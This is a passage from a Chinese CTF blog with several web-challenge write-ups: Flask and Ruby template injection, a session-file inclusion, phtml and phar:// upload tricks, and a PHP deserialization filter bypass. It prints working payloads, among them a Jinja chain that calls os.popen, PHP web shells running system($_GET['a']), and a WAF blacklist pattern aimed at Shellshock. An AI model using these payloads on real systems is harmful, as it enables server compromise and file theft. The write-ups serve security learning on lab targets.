class="line">ft262cg8vj2v0r8feei75nlveojcmu32</span><br></pre></td></tr></table></figure></p>
<p>通过执行查询操作，把我们的命令写入本地文件:<br><img src="/images/22/12.png" alt=""><br>写入成功利用本地文件包含漏洞执行命令，session文件默认保存在/tmp/sess_你的sessionid下:<br><img src="/images/22/13.png" alt=""><br>可以看到命令成功执行了，接着读取根目录文件，发现下面有个nctfffffffff文件，读取得到flag:<br><img src="/images/22/14.png" alt=""></p>
<h2 id="flask真香"><a href="#flask真香" class="headerlink" title="flask真香"></a>flask真香</h2><p>这看题目第一反应就是ssti,进去一测试，果不其然:<br><img src="/images/22/15.png" alt=""><br>接着测试发现config，items，for，mro等等都被过滤了，但是有个特点，在我测试双写绕过时发现了这貌似是个贪婪模式，没办法进行绕过，但是前段时间Tykyo里面有道题目是把config置换为了none了，我在想会不会这里也是一样的，接着测试，发现了果然是这样:<br><img src="/images/22/16.png" alt=""><br>接着普及几个魔术方法，这些都是用来找类调用所使用的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure></p>
<p>首先找到object类:<br><img src="/images/22/17.png" alt=""><br>查看有啥可利用的子类:<br><img src="/images/22/18.png" alt=""><br>emmmm，在357位置找到了了一个warnings，这下面是可以调用os模块的，接着调出可以执行命令的函数popen就可以读取文件了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__claconfigss__.__baconfigse__.__subclaconfigsses__()[357]()._module.__buiconfigltins__[&apos;__imconfigport__&apos;](&apos;oconfigs&apos;).poconfigpen(&apos;ls -a&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在根目录下发现了Th1s__is_S3cret文件，读取文件就能得到flag.</p>
<h2 id="Funny-Emoji-I"><a href="#Funny-Emoji-I" class="headerlink" title="Funny_Emoji I"></a>Funny_Emoji I</h2><p>这题目特别有意思，里面表情包可好玩了！<br>打开链接，发现有个emoji功能，但是需要登入，既然有注册页面那就先注册，进去emoji功能界面:<br><img src="/images/22/19.png" alt=""><br>发现我们可以选择图片，下面有个文本框可以任意输入，点击旁边的按钮就能得到表情包。不过在查看页面源代码的时候发现了这样一点:<br><img src="/images/22/20.png" alt=""><br>这会远程加载一个文件，我们可以访问一下，尝试更改参数发现了，image.php会根据我们传入的name参数改变图片样式。<br>接着没啥思路了…..不过刚刚查看源码的时候，发现了一段js混淆加密的代码，解码发现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function encccccrypt(s) &#123;</span><br><span class="line">    flag = &apos;&apos;;</span><br><span class="line">    for (i = 0; i &lt; s.length; i++) &#123;</span><br><span class="line">        flag += String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length))</span><br><span class="line">    &#125;</span><br><span class="line">    return btoa(flag)</span><br><span class="line">&#125;</span><br><span class="line">var key = &apos;nctf23333&apos;;</span><br><span class="line"></span><br><span class="line">function hold_data(s) &#123;</span><br><span class="line">    return s.replace(&apos;\n&apos;, &apos;%0a&apos;)</span><br><span class="line">&#125;</span><br><span class="line">var enccccrypt = atob;</span><br><span class="line"></span><br><span class="line">function get_images() &#123;</span><br><span class="line">    var s = document.getElementById(&apos;sel&apos;);</span><br><span class="line">    var i = document.getElementById(&apos;ima&apos;);</span><br><span class="line">    var index = s.selectedIndex;</span><br><span class="line">    i.src = &quot;images/&quot; + s.options[index].value + &quot;.jpg&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_my_image() &#123;</span><br><span class="line">    var s = document.getElementById(&apos;sel&apos;);</span><br><span class="line">    var i = document.getElementById(&apos;ima2&apos;);</span><br><span class="line">    var t = document.getElementById(&apos;text&apos;);</span><br><span class="line">    var index = s.selectedIndex;</span><br><span class="line">    var im_name = s.options[index].value;</span><br><span class="line">    var im_text = t.value;</span><br><span class="line">    var ptl = encccccrypt(enccccrypt(&quot;ZGF0YTovL3RleHQvcGxhaW4s&quot;));</span><br><span class="line">    var data = hold_data(im_text);</span><br><span class="line">    i.src = &quot;image.php?name=&quot; + im_name + &quot;&amp;data=&quot; + data + &quot;&amp;ptl=&quot; + ptl</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先把里面可疑一段base64解码，发现:<br><img src="/images/22/21.png" alt=""><br>emmmm，这貌似可以通过data协议写入shell。按照它加密的方式我们尝试这样的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是回显不太对：<br><img src="/images/22/22.png" alt=""><br>按照原来的字符输出了，这里让我想到一篇文章，说的是如果使用file_put_contents()函数测试，那么会按照原来的字符串输出，所以尝试读一下flag.php，因为data参数的值是接在ptl参数后的，所以data参数不传值，flag到手:<br><img src="/images/22/23.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/28/NCTF-Web-wp/" data-id="cjsk8gf08000g5cvjpvta41in" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-近期比赛的归纳总结" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/18/近期比赛的归纳总结/" class="article-date">
  <time class="post-time" datetime="2018-11-18T15:38:27.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br>
    <span class="post-day">18</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/18/近期比赛的归纳总结/">近期比赛的归纳总结</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近比赛一波接一波，但是我又是忙着演出排练没时间打，好不容易抽出时间来比赛又被打的自闭又自闭，写个博客记录一下原来没注意过的小技巧和骚操作吧。</p>
<h2 id="Easy-upload"><a href="#Easy-upload" class="headerlink" title="Easy_upload"></a>Easy_upload</h2><p>说来惭愧，这是新生赛的一道题目，真的学到了这个技巧。<br>打开页面是一个普通的界面，上传png文件发现了一个过滤：<br><img src="/images/21/1.png" alt=""><br>碰到这种过滤，我们可以使用phtml的文件来进行绕过，phtml文件可以把文件中存在html的标签进行处理再作为php文件执行，我们可以上传一个如下的phtml的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">system($_GET[&apos;a&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>接着找到文件目录执行?a=cd ..;ls查看文件，读取flag.php就行了。</p>
<h2 id="Crazy-Train"><a href="#Crazy-Train" class="headerlink" title="Crazy Train"></a>Crazy Train</h2><p>这题目真的学到了很多东西。这是一道关于Ruby的SSTI注入的题目，里面的技巧会慢慢讲。<br>打开网站发现只是一个简单的留言系统，只有一个新建文章的功能：<br><img src="/images/21/2.png" alt=""><br>点进去发现只有文章标题和文章内容可以编辑：<br><img src="/images/21/3.png" alt=""><br>emmmmm，一开始我是想尝试xss的，但是发现我们好像并不能确定文章是否传过去了，也不能确认是否有admin查看我们的文章，所以只能尝试其他思路…..抓包看看有没有可疑参数：<br><img src="/images/21/4.png" alt=""><br>发现了一个隐藏的参数，结合刚刚我们传文章过去无回显可以猜测一下是不是ssti注入，使用BuiltWith确定框架是Ruby，接着可以尝试一下如下攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 2 * 2 %&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/21/5.png" alt=""><br>接下来就简单多了，查了查Ruby的File类读文件调用方式，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File.open(&apos;路径&apos;).read</span><br></pre></td></tr></table></figure></p>
<p>尝试读取/etc/passwd:<br><img src="/images/21/6.png" alt=""><br>接下来的问题就是不知道我们所读取flag的路径在哪里，经过查阅Ruby有关dir类发现了这样一个函数：<br><img src="/images/21/7.png" alt=""><br>接下来就简单了，毕竟什么过滤也没有，操作如下：<br><img src="/images/21/8.png" alt=""><br><img src="/images/21/9.png" alt=""><br><img src="/images/21/10.png" alt=""></p>
<h2 id="Archivr"><a href="#Archivr" class="headerlink" title="Archivr"></a>Archivr</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>emmmmm，睡了一觉起来发现题目已经关了，真的无语，下一次尽量熬夜复现完吧。<br>点开链接发现是一个可以上传文件的系统，但是只能上传小于5kb的文件，上传文件会得到一个key，通过这个key能下载我们这个文件，不过链接的参数有一个可利用漏洞，文件包含：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fun.ritsec.club:8004/index.php?page=upload</span><br></pre></td></tr></table></figure></p>
<p>利用文件包含漏洞就能读取出所有的源码，初步审计一波，我把有价值的给挑出来分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;) &#123;</span><br><span class="line">    if ($_FILES[&apos;upload&apos;][&apos;size&apos;] &gt; 5000) &#123; //max 5KB</span><br><span class="line">        die(&quot;File too large!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_FILES[&apos;upload&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $upload_time = time();</span><br><span class="line">    $upload_dir = &quot;uploads/&quot; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]) . &quot;/&quot;;</span><br><span class="line"></span><br><span class="line">    $ext = &quot;&quot;;</span><br><span class="line">    if (strpos($filename, &apos;.&apos;) !== false) &#123;</span><br><span class="line">        $f_ext = explode(&quot;.&quot;, $filename)[1];</span><br><span class="line">        if (ctype_alnum($f_ext) &amp;&amp; stripos($f_ext, &quot;php&quot;) === false &amp;&amp; stripos($f_ext, &quot;pht&quot;) === false) &#123;</span><br><span class="line">            $ext = &quot;.&quot; . $f_ext;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ext = &quot;.dat&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $ext = &quot;.dat&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_path = $upload_dir . md5($upload_time) . $ext;</span><br><span class="line">    mkdir($upload_dir, 0770, true);</span><br><span class="line"></span><br><span class="line">    //Enforce maximum of 10 files</span><br><span class="line">    $dir = new DirLister($upload_dir);</span><br><span class="line">    if ($dir-&gt;getCount() &gt;= 10) &#123;</span><br><span class="line">        unlink($upload_dir . $dir-&gt;getOldestFile());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($_FILES[&apos;upload&apos;][&apos;tmp_name&apos;], $upload_path);</span><br><span class="line">    $key = $upload_time . $ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里给了上传文件的储存目录生成方式，以及两个黑名单，通过检查php?或者pht?来过滤文件的后缀名。目录通过获取我们的ip地址以及当前的时间戳来生成最终地址。  </p>
<h3 id="phar协议"><a href="#phar协议" class="headerlink" title="phar协议"></a>phar协议</h3><p>题目过滤了php，php5，phtml等等，通过用一些后缀名来绕过貌似行不通，这里用到了一种协议-phar协议。<br>phar协议适用于php&gt;5.3.0版本，官方文档如下：<br><img src="/images/21/11.png" alt=""><br>简单来说，就是一个打包解包的过程，在我们传输压缩文件的时候，服务器会对压缩包进行解压然后执行文件内容，也就是说我们可以利用phar协议去解析我们上传的压缩包，例如：<br>我们新建一个php文件如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo system($_GET[&quot;a&quot;]); ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>将它压缩为zip文件，然后上传使用phar协议去读取../../xxx.zip/xxx.php就能执行任意命令了。 </p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>一般来说，我们通过外网的服务器去请求内网数据的时候，外网的代理服务器就像一个跳板一样，让我们通过它去访问内网的服务器，正向代理的服务器作用也仅仅是作为跳板，但是反向代理不一样，我们访问反向代理服务器，代理服务器会通过自己的ip去访问内网服务器，然后将接受的信息返回给我们，反向代理服务器对外表现就像是一个内网服务器一样。具体分析可以参考：<br><a href="https://www.cnblogs.com/Anker/p/6056540.html" target="_blank" rel="noopener">https://www.cnblogs.com/Anker/p/6056540.html</a>  </p>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>既然我们可以通过phar协议去执行命令，那么现在问题就是如何找到目录，我们在源码中看到了服务器会将我们的ip进行md5然后加上当前时间戳的md5加后缀名来生成路径，但是在我加密了我的ip，去访问路径的时候发现返回了404，这就很奇怪，按理来说应该没问题，但是目录不存在是怎么回事？<br>这就是反向代理的原因了，我们访问的服务器是一个代理服务器，而我们所要的资源则是在内网服务器上，所以代理服务器在访问内网资源时，所用的ip就是它本身ip，并不是我们自身的ip，那问题又来了，我们如何得到服务器ip呢？<br>一个大师傅想到了所有的题目都是部署在一个服务器上，那么可以通过其他的题目来获取ip地址啊，例如上一题的Ruby SSTI注入，我们可以获取所有环境变量的信息：<br><img src="/images/21/12.png" alt=""><br><img src="/images/21/13.png" alt=""><br>通过request类来读取服务器ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@_request.instance_variable_get(:env)</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/21/14.png" alt=""><br>上传zip文件，接着访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fun.ritsec.club:8004/uploads/98d3cbed97b0bc491c000455c9f8e6fb/md5(time()).zip/1.php?a=ls</span><br></pre></td></tr></table></figure></p>
<p>读flag文件就行了。  </p>
<h2 id="php-is-funny-chal8"><a href="#php-is-funny-chal8" class="headerlink" title="php_is_funny_chal8"></a>php_is_funny_chal8</h2><p>最近刷题接触到了几道反序列化问题，发现有道题目还是挺好的，补充了一个新的知识点。<br>题目点开扫目录，发现了一个index.php.bak，审计一波代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;open_basedir&quot;,dirname(__FILE__));</span><br><span class="line">#GOAL: file_get_content(&apos;sbztz.php&apos;)    : )</span><br><span class="line">   </span><br><span class="line">    class just4fun &#123;</span><br><span class="line">        public $filename;</span><br><span class="line">   </span><br><span class="line">        function __toString() &#123;</span><br><span class="line">            return @file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    $data = stripslashes($_GET[&apos;data&apos;]);</span><br><span class="line">    if (!$data) &#123;</span><br><span class="line">        die(&quot;hello from y&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    $token = $data[0];</span><br><span class="line">    $pass = true; </span><br><span class="line">   </span><br><span class="line">    switch ( $token ) &#123;</span><br><span class="line">        case &apos;a&apos; :</span><br><span class="line">        case &apos;O&apos; :</span><br><span class="line">        case &apos;b&apos; :</span><br><span class="line">        case &apos;i&apos; :</span><br><span class="line">        case &apos;d&apos; :</span><br><span class="line">            $pass = ! (bool) preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data );</span><br><span class="line">            break;</span><br><span class="line">   </span><br><span class="line">        default:</span><br><span class="line">            $pass = false;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    if (!$pass) &#123;</span><br><span class="line">      die(&quot;TKS L.N.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    echo unserialize($data);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- ./challenge8.php.bak --&gt;</span><br></pre></td></tr></table></figure></p>
<p>题目要求就是让我们把sbztz.php给包含出，源码给出了一个类，类里面有一个__toString()函数，只要我们通过序列化触发类里面的函数就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class just4fun &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return @file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new just4fun(&quot;a&quot;);</span><br><span class="line">$a-&gt;filename = &quot;sbztz.php&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是源码有一个过滤需要绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$token = $data[0];</span><br><span class="line">    $pass = true; </span><br><span class="line">   </span><br><span class="line">    switch ( $token ) &#123;</span><br><span class="line">        case &apos;a&apos; :</span><br><span class="line">        case &apos;O&apos; :</span><br><span class="line">        case &apos;b&apos; :</span><br><span class="line">        case &apos;i&apos; :</span><br><span class="line">        case &apos;d&apos; :</span><br><span class="line">            $pass = ! (bool) preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data );</span><br><span class="line">            break;</span><br><span class="line">   </span><br><span class="line">        default:</span><br><span class="line">            $pass = false;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    if (!$pass) &#123;</span><br><span class="line">      die(&quot;TKS L.N.&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>emmm，也就是说我们输入的data不能是例如开头为<strong>O:123:</strong>这种类型的，这里提供了一种比较特殊的绕过方式，分析可以看这篇文章:<a href="http://www.phpbug.cn/archives/32.html。" target="_blank" rel="noopener">http://www.phpbug.cn/archives/32.html。</a><br>里面提到了在我们生成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+8:&quot;just4fun&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;sbztz.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个payload，在Object后加个+依旧可以正常的反序列化，所以最终payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+8:&quot;just4fun&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;sbztz.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>PS:直接传参还不行，必须对符号都进行url编码才能得到flag，具体原因不太清楚.</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/18/近期比赛的归纳总结/" data-id="cjsk8gf3n002r5cvjtz02zsih" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-结合CVE的一道命令执行弹shell的题目" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/01/结合CVE的一道命令执行弹shell的题目/" class="article-date">
  <time class="post-time" datetime="2018-11-01T08:22:00.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br>
    <span class="post-day">01</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/01/结合CVE的一道命令执行弹shell的题目/">结合CVE的一道命令执行弹shell的题目</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>这是hackme一道题目，这道题目结合了一个高危的cve以及弹shell的操作，从这题目学到了挺多东西的，为此把这道题目记录一下。</p>
<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>题目地址：<a href="https://command-executor.hackme.inndy.tw/" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/</a><br>打开发现网页有几个明显的功能：<br><img src="/images/20/1.png" alt=""><br>第一个页面是man的函数说明，第二个功能是则是上传文件，第三个功能就是输入命令执行了，但是被限制的很死，也就是说只能执行ls以及env，第四个就是ls读取文件，但是只能读取四个目录的文件，不过问题不大，可以更改file参数来更改读取目录。不过点点的时候发现了一个很明显的漏洞：<br><img src="/images/20/2.png" alt=""><br>这里很容易想到可以尝试用文件包含来读取源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
<p>读取出index.php源码，挑出一些值得审计的代码，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pages = [</span><br><span class="line">    [&apos;man&apos;, &apos;Man&apos;],</span><br><span class="line">    [&apos;untar&apos;, &apos;Tar Tester&apos;],</span><br><span class="line">    [&apos;cmd&apos;, &apos;Cmd Exec&apos;],</span><br><span class="line">    [&apos;ls&apos;, &apos;List files&apos;],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function fuck($msg) &#123;</span><br><span class="line">    header(&apos;Content-Type: text/plain&apos;);</span><br><span class="line">    echo $msg;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function waf($a) &#123;</span><br><span class="line">    global $black_list;</span><br><span class="line">    if(is_array($a)) &#123;</span><br><span class="line">        foreach($a as $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        foreach($black_list as $b) &#123;</span><br><span class="line">            if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123;</span><br><span class="line">                fuck(&quot;$b detected! exit now.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line">function execute($cmd, $shell=&apos;bash&apos;) &#123;</span><br><span class="line">    system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">    if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123;</span><br><span class="line">        putenv(&quot;$key=$val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;func&apos;])) &#123;</span><br><span class="line">    $page = $_GET[&apos;func&apos;];</span><br><span class="line">    if(strstr($page, &apos;..&apos;) !== false) &#123;</span><br><span class="line">        $page = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($page &amp;&amp; strlen($page) &gt; 0) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        include(&quot;$page.php&quot;);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
